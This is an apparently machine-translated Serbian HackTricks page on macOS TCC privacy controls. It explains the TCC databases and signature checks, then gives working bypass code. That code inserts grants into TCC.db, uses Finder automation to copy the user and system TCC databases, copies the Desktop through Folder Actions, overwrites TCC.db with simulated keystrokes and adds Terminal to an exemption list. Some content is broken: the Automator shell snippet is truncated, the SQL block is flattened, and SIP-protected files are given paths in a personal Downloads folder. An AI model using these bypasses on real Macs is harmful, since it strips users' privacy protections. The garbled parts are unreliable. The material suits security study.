# macOS TCC

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

**TCC (Transparentnost, Saglasnost i Kontrola)** je sigurnosni protokol koji se fokusira na regulisanje dozvola aplikacija. Njegova osnovna uloga je da zaštiti osetljive funkcije poput **usluga lokacije, kontakata, fotografija, mikrofona, kamere, pristupačnosti i punog pristupa disku**. Zahtevajući eksplicitnu saglasnost korisnika pre nego što aplikacija dobije pristup ovim elementima, TCC poboljšava privatnost i kontrolu korisnika nad njihovim podacima.

Korisnici se susreću sa TCC-om kada aplikacije zatraže pristup zaštićenim funkcijama. To je vidljivo kroz prozor koji korisnicima omogućava da **odobre ili odbiju pristup**. Osim toga, TCC omogućava direktna korisnička dejstva, poput **prevlačenja i ispuštanja fajlova u aplikaciju**, kako bi se odobrio pristup određenim fajlovima, obezbeđujući da aplikacije imaju pristup samo onome što je eksplicitno dozvoljeno.

![Primer TCC prozora](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** upravlja **daemon**-om smeštenim u `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` i konfigurisan u `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrovanje mach servisa `com.apple.tccd.system`).

Postoji **tccd u režimu korisnika** koji se pokreće po prijavljivanju korisnika, definisan u `/System/Library/LaunchAgents/com.apple.tccd.plist` registrovanjem mach servisa `com.apple.tccd` i `com.apple.usernotifications.delegate.com.apple.tccd`.

Ovde možete videti tccd koji se izvršava kao sistem i kao korisnik:

```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```

Dozvole se **nasleđuju od roditeljske** aplikacije i **dozvole** se **prate** na osnovu **Bundle ID**-a i **Developer ID**-a.

### TCC Baze podataka

Dozvole/zabrane se zatim čuvaju u nekim TCC bazama podataka:

* Sistemski široka baza podataka u **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Ova baza podataka je **SIP zaštićena**, tako da samo SIP prekidač može da piše u nju.
* Korisnička TCC baza podataka **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** za korisničke preference.
* Ova baza podataka je zaštićena tako da samo procesi sa visokim TCC privilegijama poput Puna disk pristupa mogu da pišu u nju (ali nije zaštićena SIP-om).

{% hint style="warning" %}
Prethodne baze podataka su takođe **TCC zaštićene za čitanje pristupa**. Dakle, **nećete moći da čitate** svoju redovnu korisničku TCC bazu podataka osim ako je to iz procesa sa TCC privilegijama.

Međutim, zapamtite da će proces sa ovim visokim privilegijama (kao što su **FDA** ili **`kTCCServiceEndpointSecurityClient`**) moći da piše u korisničku TCC bazu podataka
{% endhint %}

* Postoji **treća** TCC baza podataka u **`/var/db/locationd/clients.plist`** koja označava klijente koji su dozvoljeni da **pristupaju lokacionim uslugama**.
* SIP zaštićena datoteka **`/Users/carlospolop/Downloads/REG.db`** (takođe zaštićena od čitanja pristupa sa TCC), sadrži **lokaciju** svih **validnih TCC baza podataka**.
* SIP zaštićena datoteka **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (takođe zaštićena od čitanja pristupa sa TCC), sadrži više TCC odobrenih dozvola.
* SIP zaštićena datoteka **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (ali čitljiva od strane bilo koga) je lista aplikacija koje zahtevaju TCC izuzetak.

{% hint style="success" %}
TCC baza podataka u **iOS**-u je u **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
**UI centar za obaveštenja** može napraviti **promene u sistemskoj TCC bazi podataka**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Međutim, korisnici mogu **brisati ili upitati pravila** pomoću **`tccutil`** komandne linije.
{% endhint %}

#### Upitaj baze podataka

{% tabs %}
{% tab title="korisnička baza podataka" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="sistem DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Proverom oba baze podataka možete proveriti dozvole koje je aplikacija dozvolila, zabranila ili nema (zatražiće je).
{% endhint %}

* **`service`** je TCC **string reprezentacija dozvole**
* **`client`** je **bundle ID** ili **putanja do binarnog fajla** sa dozvolama
* **`client_type`** označava da li je to identifikator paketa(0) ili apsolutna putanja(1)

<details>

<summary>Kako izvršiti ako je to apsolutna putanja</summary>

Samo uradite **`launctl load you_bin.plist`**, sa plistom kao što je:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```

</details>

* **`auth_value`** može imati različite vrednosti: denied(0), unknown(1), allowed(2), ili limited(3).
* **`auth_reason`** može imati sledeće vrednosti: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Polje **csreq** služi da naznači kako proveriti binarnu datoteku za izvršavanje i dodeliti TCC dozvole:

```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```

* Za više informacija o **ostalim poljima** tabele [**proverite ovaj blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Takođe možete proveriti **već dodeljene dozvole** aplikacijama u `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

{% hint style="success" %}
Korisnici _mogu_ **brisati ili upitati pravila** koristeći **`tccutil`**.
{% endhint %}

#### Resetovanje TCC dozvola

```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```

### Provere potpisa TCC

TCC **baza podataka** čuva **Bundle ID** aplikacije, ali takođe **čuva** **informacije** o **potpisu** kako bi **proverila** da li aplikacija koja traži dozvolu za korišćenje određene funkcije je tačno ona koja tvrdi da jeste.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Zbog toga druge aplikacije koje koriste isto ime i identifikator paketa neće moći pristupiti odobrenim dozvolama date drugim aplikacijama.
{% endhint %}

### Ovlašćenja i TCC Dozvole

Aplikacije **ne samo da moraju** zatražiti i dobiti **pristup** određenim resursima, već takođe moraju **imati relevantna ovlašćenja**.\
Na primer, **Telegram** ima ovlašćenje `com.apple.security.device.camera` da zatraži **pristup kameri**. Aplikacija koja **nema** ovo **ovlašćenje neće moći** pristupiti kameri (i korisnik neće biti ni pitao za dozvole).

Međutim, da bi aplikacije **pristupile** određenim korisničkim fasciklama, kao što su `~/Desktop`, `~/Downloads` i `~/Documents`, **ne moraju** imati određena **ovlašćenja.** Sistem će transparentno upravljati pristupom i **pitati korisnika** po potrebi.

Apple-ove aplikacije **neće generisati prozore sa upitima**. One sadrže **unapred odobrena prava** na svojoj listi **ovlašćenja**, što znači da **nikada neće generisati iskačući prozor**, **niti** će se pojaviti u bilo kojoj od **TCC baza podataka.** Na primer:

```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```

Ovo će sprečiti Kalendar da traži od korisnika pristup podsetnicima, kalendaru i adresaru.

{% hint style="success" %}
Pored nekih zvaničnih dokumenata o ovlašćenjima, takođe je moguće pronaći nezvanične **interesantne informacije o ovlašćenjima na** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Neke TCC dozvole su: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Ne postoji javna lista koja definiše sve od njih, ali možete proveriti ovaj [**spisak poznatih**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Osetljiva nezaštićena mesta

* $HOME (sama po sebi)
* $HOME/.ssh, $HOME/.aws, itd
* /tmp

### Korisnička namera / com.apple.macl

Kao što je ranije pomenuto, moguće je **dodeliti pristup aplikaciji fajlu prevlačenjem i ispuštanjem**. Ovaj pristup neće biti naveden u bilo kojoj TCC bazi podataka već kao **prošireni** **atribut fajla**. Ovaj atribut će **čuvati UUID** odobrene aplikacije:

```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```

{% hint style="info" %}
Zanimljivo je da se atribut **`com.apple.macl`** upravlja preko **Sandbox-a**, a ne preko tccd.

Takođe, imajte na umu da ako premestite datoteku koja omogućava UUID aplikacije na vašem računaru na drugi računar, jer ista aplikacija će imati različite UID-ove, neće omogućiti pristup toj aplikaciji.
{% endhint %}

Prošireni atribut `com.apple.macl` **ne može biti očišćen** kao ostali prošireni atributi jer je **zaštićen SIP-om**. Međutim, kao što je [**objašnjeno u ovom postu**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), moguće je onemogućiti ga **kompresovanjem** datoteke, **brisanjem** i **dekompresovanjem**.

## TCC Privesc & Bypasses

### Ubacivanje u TCC

Ako u nekom trenutku uspete da dobijete pristup pisanju preko TCC baze podataka, možete koristiti nešto slično sledećem kako biste dodali unos (uklonite komentare):

<details>

<summary>Primer ubacivanja u TCC</summary>

\`\`\`sql INSERT INTO access ( service, client, client\_type, auth\_value, auth\_reason, auth\_version, csreq, policy\_id, indirect\_object\_identifier\_type, indirect\_object\_identifier, indirect\_object\_code\_identity, flags, last\_modified, pid, pid\_version, boot\_uuid, last\_reminded ) VALUES ( 'kTCCServiceSystemPolicyDesktopFolder', -- service 'com.googlecode.iterm2', -- client 0, -- client\_type (0 - bundle id) 2, -- auth\_value (2 - allowed) 3, -- auth\_reason (3 - "User Set") 1, -- auth\_version (always 1) X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now NULL, -- policy\_id NULL, -- indirect\_object\_identifier\_type 'UNUSED', -- indirect\_object\_identifier - default value NULL, -- indirect\_object\_code\_identity 0, -- flags strftime('%s', 'now'), -- last\_modified with default current timestamp NULL, -- assuming pid is an integer and optional NULL, -- assuming pid\_version is an integer and optional 'UNUSED', -- default value for boot\_uuid strftime('%s', 'now') -- last\_reminded with default current timestamp ); \`\`\`

</details>

### TCC Payloads

Ako ste uspeli da uđete u aplikaciju sa nekim TCC dozvolama, proverite sledeću stranicu sa TCC payloadima kako biste ih zloupotrebili:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Automatizacija (Finder) do FDA\*

Ime TCC dozvole za Automatizaciju je: **`kTCCServiceAppleEvents`**\
Ova specifična TCC dozvola takođe pokazuje **aplikaciju koja može biti upravljana** unutar TCC baze podataka (tako da dozvole ne dozvoljavaju upravljanje svime).

**Finder** je aplikacija koja **uvek ima FDA** (čak i ako se ne prikazuje u korisničkom interfejsu), tako da ako imate **Automatizaciju** privilegije nad njom, možete zloupotrebiti njene privilegije da **je naterate da obavi neke radnje**.\
U ovom slučaju, vaša aplikacija bi trebalo da ima dozvolu **`kTCCServiceAppleEvents`** nad **`com.apple.Finder`**.

{% tabs %}
{% tab title="Ukradi korisnički TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Ukradi sistemski TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Možete zloupotrebiti ovo da **napišete svoju bazu podataka korisnika TCC**.

{% hint style="warning" %}
Sa ovlašćenjem ćete moći **zatražiti od Findera pristup TCC ograničenim fasciklama** i dati vam fajlove, ali koliko znam nećete moći da naterate Finder da izvrši proizvoljan kod kako biste potpuno zloupotrebili njegov pristup FDA.

Stoga, nećete moći zloupotrebiti sve mogućnosti FDA.
{% endhint %}

Ovo je TCC prozor za dobijanje privilegija automatizacije nad Finderom:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Imajte na umu da zato što aplikacija **Automator** ima TCC ovlašćenje **`kTCCServiceAppleEvents`**, može **kontrolisati bilo koju aplikaciju**, poput Findera. Dakle, imajući ovlašćenje za kontrolu Automatora, takođe biste mogli kontrolisati **Finder** pomoću koda kao što je prikazano ispod:
{% endhint %}

<details>

<summary>Get a shell inside Automator</summary>

\`\`\`applescript osascript<

tell application "Automator" set actionID to Automator action id "com.apple.RunShellScript" tell (make new workflow) add actionID to it tell last Automator action set value of setting "inputMethod" to 1 set value of setting "COMMAND\_STRING" to theScript end tell execute it end tell activate end tell EOD

## Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear

````
</details>

Isto važi i za **Script Editor aplikaciju,** ona može kontrolisati Finder, ali korišćenjem AppleScript-a ne možete je naterati da izvrši skriptu.

### Automatizacija (SE) ka nekim TCC

**System Events može kreirati Folder Actions, a Folder Actions mogu pristupiti nekim TCC folderima** (Desktop, Documents & Downloads), tako da se skripta poput sledeće može koristiti za zloupotrebu ovog ponašanja:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
````

#### Automatizacija (SE) + Pristupačnost (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** do FDA\*

Automatizacija na **`System Events`** + Pristupačnost (**`kTCCServicePostEvent`**) omogućava slanje **tastera na procese**. Na ovaj način možete zloupotrebiti Finder da promenite korisnički TCC.db ili da date FDA proizvoljnoj aplikaciji (mada će možda biti potrebna lozinka za ovo).

Primer prebrisavanja korisničkog TCC.db preko Findera:

```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```

#### `kTCCServiceAccessibility` ka FDA\*

Proverite ovu stranicu za neke [**payload-ove za zloupotrebu dozvola za pristupačnost**](macos-tcc-payloads.md#accessibility) kako biste postigli privilegije eskalacije do FDA\* ili na primer pokrenuli keylogger.

#### Klijent za bezbednost krajnjih tačaka ka FDA

Ako imate **`kTCCServiceEndpointSecurityClient`**, imate FDA. Kraj.

#### Sistemski pravilnik SysAdmin fajlova ka FDA

**`kTCCServiceSystemPolicySysAdminFiles`** omogućava **promenu** atributa **`NFSHomeDirectory`** korisnika što menja njegov matični folder i time omogućava **zaobilazak TCC**.

#### Korisnička TCC baza podataka ka FDA

Dobijanjem **dozvola za pisanje** nad **korisničkom TCC** bazom podataka ne možete sebi dodeliti **`FDA`** dozvole, samo onaj koji se nalazi u sistemskoj bazi podataka može to da dodeli.

Ali možete sebi dati **`Automatizaciju prava za Finder`**, i zloupotrebiti prethodnu tehniku za eskalaciju do FDA\*.

#### **FDA ka TCC dozvolama**

**Pristup celom disku** u TCC naziv je **`kTCCServiceSystemPolicyAllFiles`**

Ne mislim da je ovo prava eskalacija privilegija, ali u slučaju da vam bude korisno: Ako kontrolišete program sa FDA možete **modifikovati korisničku TCC bazu podataka i sebi dodeliti bilo kakav pristup**. Ovo može biti korisno kao tehnika upornosti u slučaju da izgubite svoje FDA dozvole.

#### **SIP zaobilazak ka TCC zaobilasku**

Sistem **TCC baza podataka** je zaštićena sa **SIP**, zbog toga samo procesi sa **naznačenim privilegijama** mogu da je modifikuju. Dakle, ako napadač pronađe **SIP zaobilazak** nad **fajlom** (može da modifikuje fajl ograničen SIP-om), biće u mogućnosti da:

* **Ukloni zaštitu** TCC baze podataka i dodeli sebi sve TCC dozvole. Mogao bi zloupotrebiti bilo koji od ovih fajlova na primer:
* TCC sistemsku bazu podataka
* REG.db
* MDMOverrides.plist

Međutim, postoji još jedna opcija za zloupotrebu ovog **SIP zaobilaska za zaobilaženje TCC**, fajl `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` je lista aplikacija koje zahtevaju TCC izuzetak. Dakle, ako napadač može **ukloniti SIP zaštitu** sa ovog fajla i dodati svoju **sopstvenu aplikaciju**, aplikacija će moći da zaobiđe TCC.\
Na primer, da dodate terminal:

```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```

AllowApplicationsList.plist:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```

#### TCC Bypassovi

### Reference

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

</details>
